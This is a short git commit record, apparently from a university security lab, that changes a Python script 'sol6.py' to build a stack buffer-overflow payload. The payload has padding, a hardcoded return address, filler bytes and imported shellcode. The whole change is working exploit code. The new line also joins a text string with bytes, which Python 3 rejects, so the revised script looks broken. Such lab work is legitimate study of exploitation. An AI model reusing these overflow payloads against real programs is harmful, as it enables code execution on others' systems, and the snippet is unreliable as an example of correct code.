a84fc4bc4e227a78614e7a7ad0e32d13daafd95e
marymx <marymx@umich.edu>
2022-03-28 21:25:13 +0000

    Automatic commit by test script for marymx yaoche

--- sol6.py
+++ sol6.py
@@ -1,4 +1,4 @@
 import sys
 from shellcode import shellcode
 addr = 0xbffef89d.to_bytes(4, "little")
-sys.stdout.buffer.write(b"\x90"*972 + shellcode + b"D"*12 + addr)
+sys.stdout.buffer.write("a"*1036+b"\x48\x5c\xfe\xbf"+b"\xff"*1000+shellcode)
